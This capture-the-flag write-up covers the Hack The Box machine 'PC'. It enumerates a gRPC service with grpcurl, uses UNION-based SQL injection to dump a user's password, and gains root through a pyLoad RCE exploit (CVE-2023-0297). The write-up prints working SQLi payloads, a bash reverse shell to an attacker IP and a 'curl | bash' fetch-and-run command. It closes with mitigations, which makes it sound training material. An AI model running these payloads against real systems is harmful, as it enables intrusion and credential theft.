## Enumeration

First let's start by running enumeration on our box located at `10.10.11.214` I like to use the tool [AutoRecon](https://github.com/Tib3rius/AutoRecon) as it vastly speeds up the enumeration process

```bash
sudo autorecon <ip>
```

Checking our `_full_tcp_nmap.txt` that autorecon generated for us. We see that ports `22` and `50051` are open

![Nmap Scan](assets/images/HTB - PC/Nmap scan.png)

Doing a quick good search tells us that port 50051 is typically associated with gRPC (Google Remote Procedure Calls) which essentially facilitates services within a distributed application, regardless of the programming language usd or machine / container they're located on as well as optimizing overhead

We can run the tool `grpcurl` to list the available services on a gRPC server

```bash
grpcurl -plaintext 10.10.11.214:50051 list
```

We see the following `SimpleApp` & `grpc.reflection.v1alpha.ServerReflection` services

![grpc curl](/assets/images/HTB%20-%20PC/gRPC%20curl.png)

We can run the following command against the service to identify the RPC methods

```bash
grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp
```

![grpc methods](/assets/images/HTB%20-%20PC/grpc%20methods.png)

We've successfully identified the following three service methods

- LoginUser
- RegisterUser
- getInfo

Before we can attempt to exploit these methods, we need to understand the structure of the request and response message for each method. We can use the the following command to accomplish this

```bash
# Describe Request and Response Types for "LoginUser"
grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserRequest
grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserResponse
```

![Request and response type](/assets/images/HTB%20-%20PC/Request%20and%20respones%20type.png)

Now that we have a detailed structure, we can craft a request and perform tests. Let's try to send data to the `RegisteredUser` endpoint in the form of creating an account

```bash
grpcurl -plaintext -d '{"username": "Jigsaw64", "password": "PleaseHireMe"}' 10.10.11.214:50051 SimpleApp.RegisterUser
```

![User Crated](/assets/images/HTB%20-%20PC/User%20created.png)

Account successfully created. Now let's login

```bash
grpcurl -plaintext -d '{"username": "Jigsaw64", "password": "PleaseHireMe"}' 10.10.11.214:50051 SimpleApp.LoginUser
```

![Login Successful](/assets/images/HTB%20-%20PC/ID%20333.png)

Login successful & our ID is `333` Now let's attempt to invoke the `getInfo` method with our ID

```bash
grpcurl -plaintext -d '{"id": "333"}' 10.10.11.214:50051 SimpleApp.getInfo
```

![Missing token header](/assets/images/HTB%20-%20PC/Missing%20Token%20header.png)

It looks like to call the `getInfo` method, we need a `token` header in our request. After some research I discoverd that adding the `-vv` flag for very verbose provides us with more metadata on our request. Let's edit the `LoginUser` request and attempt it again

![Token Received](/assets/images/HTB%20-%20PC/Token%20Received.png)

Nice, we got our JSON Web Token (JWT). Now let's edit the `.getInfo` request with our token and try again

```bash
grpcurl -plaintext \
  -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiSmlnc2F3NjQiLCJleHAiOjE3MjA3NTk0MTR9.wU1nEE4r0kiPpqfc9mX4u73Yip-eHy-HQyNXCVzGsao" \
  -d '{"id": "633"}' \
  -vv \
  10.10.11.214:50051 SimpleApp.getInfo
```

We see the following message `"Will update soon."`

![Will update soon](/assets/images/HTB%20-%20PC/Will%20update%20soon.png)

It looks like logging into the service worked. Let's try a basic SQL injection in the ID parameter

```bash
grpcurl -plaintext \
  -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiSmlnc2F3NjQiLCJleHAiOjE3MjA3NTk0MTR9.wU1nEE4r0kiPpqfc9mX4u73Yip-eHy-HQyNXCVzGsao" \
  -d '{"id": "555 OR 1=1"}' \
  -vv \
  10.10.11.214:50051 SimpleApp.getInfo
```

We get the reponse `"message": "The admin is working hard to fix the issues.`

It looks like our simple SQL injection payload worked. Instead of querying specifically for the ID of 555, it evaluated 1=1 to true, retraining data related to the admin message

Let's trying querying for the DB version

```bash
grpcurl -plaintext \
  -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiSmlnc2F3NjQiLCJleHAiOjE3MjA3NTk0MTR9.wU1nEE4r0kiPpqfc9mX4u73Yip-eHy-HQyNXCVzGsao" \
  -d '{"id": "555 union select sqlite_version()"}' \
  -vv \
  10.10.11.214:50051 SimpleApp.getInfo
```

We've confirmed that the method we're interacting with is querying a `SQLite` DB and that the version is `3.31.1`

Now we can craft an SQLi to extract data from the `sql_master` table. Which is the table in SQLite that stores metadata on all the tables in the database. Let's grab the definition of the `accounts` table

```bash
  "id": "797 union select sql FROM sqlite_master WHERE type=\"table\" AND name=\"accounts\"; --"
```

![Accounts Table ](/assets/images/HTB%20-%20PC/Accounts%20table.png)

Great, we got the schema of the accounts table. it looks like it consists of two columns, `username (Unique)` and `password`. I will use the following command to list the username

<span style="color: red;">I had to switch my data format to text (protobuf text format) from here as I kept getting errors in my SQLi using json</span>


```bash
grpcurl -plaintext \
  -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiSmlnc2F3NjQiLCJleHAiOjE3MjA4MzU1MDJ9.vCG_S9c_VNlCb3vuF8-HXR8Rw8TWt9T3nQzeHG6FzPk" \
  -d 'id: "42 UNION SELECT group_concat(username, '"'"','"'"') FROM accounts"' \
  -format text \
  -vv \
  10.10.11.214:50051 SimpleApp.getInfo
```

![Sau User Discoverd](/assets/images/HTB%20-%20PC/sau%20user.png)

We discover this `sau` user. Now let's make the same requesting with the password

```bash
grpcurl -plaintext \
  -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiSmlnc2F3NjQiLCJleHAiOjE3MjA4MzU1MDJ9.vCG_S9c_VNlCb3vuF8-HXR8Rw8TWt9T3nQzeHG6FzPk" \
  -d 'id: "42 UNION SELECT group_concat(password, '"'"','"'"') FROM accounts"' \
  -format text \
  -vv \
  10.10.11.214:50051 SimpleApp.getInfo
```

![Sau Password](/assets/images/HTB%20-%20PC/Sau%20password.png)

The password for the `sau` user has been identified as `HereIsYourPassWord1431` Let's try to SSH in with our newly discoverd credentials 

```bash
ssh sau@10.10.11.214
```
![SSH sau](/assets/images/HTB%20-%20PC/SSH%20as%20sau.png)

## Privilege Escalation

Let's check the kernel version with a `uname -a`,  and sudo permission with a `sudo -l`

`Linux pc 5.4.0-148-generic #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux`

`Sorry, user sau may not run sudo on localhost.`

Uninteresting. Let's check running processes with `ps -ef --forest`

- `-ef` Show all processes, not just those belonging to the current user & generate a full listing, providing more verbose output

- `--forest` Display process hierarchy in a tree-like format

![PS List](/assets/images/HTB%20-%20PC/Exploitable%20Processes.png)

There's a Python application running as root:
`/usr/bin/python3 /opt/app/app.py (PID 1059)`
Another Python process running as root:
`/usr/bin/python3 /usr/local/bin/pyload (PID 1063)`

Let's check listening TCP sockets on the system with the following  command

```bash
ss -lntp
```

![Local Web Sever](/assets/images/HTB%20-%20PC/Local%20web%20server.png)

This could be a local web server or application. Let's curl the local service and see what we get

![Curled Request](/assets/images/HTB%20-%20PC/Curled%20request.png)

We've confirmed it's a web service. Let's forward this local port 8000 to our attacker machine. We'll open a new tab on our attacker machine and run the following SSH command to connect via SSH again as well as set up local port forwarding. This will allow us to access the service in our web browser on our attacker machine

```bash
ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214
```

Now let's navigate to `http://127.0.0.1:8000 / http://localhost:8000`

![pyLoad Web Interface](/assets/images/HTB%20-%20PC/Pyload%20web%20interface.png)

Let's see if we can find the version of this application. Checking the HTML source code doesn't provide anything of value. Unfortunately, the config file for pyLoad is located on the roots home directory, which we can't access. Let's check searchsploit for any exploits relating to pyLoad

```bash
searchsploit pyLoad
```

![searchsploit pyload](/assets/images/HTB%20-%20PC/Searchsploit%20Pyload.png)

We find one, let's go ahead and copy the exploit script to our current directory

```bash
cp /usr/share/exploitdb/exploits/python/webapps/51532.py .
```

Doing a bit of research to get a high-level overview of this exploit tells me it's a unauthenticated RCE that takes advantage of the `/flash/addcrypted2` endpoint in PyLoad's API. This end point of the applications API does not sanitize user input.

 This script first sends a get request to check if the host is alive. If alive it then  sends a POST with the malicious python  payload

[CVE-2023-0297](https://nvd.nist.gov/vuln/detail/CVE-2023-0297)
```
API: PyLoad API
  ├── Endpoint: /flash/addcrypted2   <- Vulnerable Endpoint
  ├── Endpoint: /login
  ├── Endpoint: /addPackage
  └── Endpoint: /startDownload
```

Let's run the script

```bash
python3 51532.py -u http://localhost:8000 -c "whoami"
```

We get the following message back `[+] Host up, let's exploit!
[+] The exploit has be executed in target machine.` which indicates that the script is working

Let's create a bash reverse shell on our machine. We'll curl it using our exploit script

```bash
gedit rev.shell
```

We'll edit the `rev.shell` script and add the following bash one liner:

`bash -i >& /dev/tcp/10.10.14.36/9001 0>&1`

Now we will do the following:

- Make the script executable `chmod +x rev.shell`
- Host the file via simple HTTP server `python3 -m http.server 8080`
- Set up our netcat listener `nc -lvnp 9001`

Now just modify the exploit to include the curl command `python3 51532.py -u http://localhost:8000 -c "curl http://10.10.14.36:8080/revshell.sh | bash"`

![Root](/assets/images/HTB%20-%20PC/Root.png)

GG, we've rooted PC!

## Vulnerabilities & Mitigation

| Vulnerability                              | Mitigation                                                        |
|--------------------------------------------|-
| Lack of Input Validation in gRPC Methods   | Validate and sanitize all user inputs. Implement strict input validation. |
| SQL Injection in gRPC Service              | Use prepared statements and parameterized queries. Validate and sanitize inputs. |
| Default or Weak SSH Credentials            | Enforce strong, unique passwords! |
| Vulnerable PyLoad Service                  | Keep all software up to date.|
| Lack of Proper Input Sanitization in PyLoad| Validate and sanitize all user inputs. Implement proper input handling in application code. |
| Local Service Access via SSH Port Forwarding (Lack of Detection) | Implement monitoring for SSH port forwarding activities. Use SSH logs, network traffic analysis, and intrusion detection systems (IDS) to detect and alert on unauthorized port forwarding. |
| Lack of Principle of Least Privilege       | Ensure services run with the minimum necessary privileges. Use proper user and permission management. |
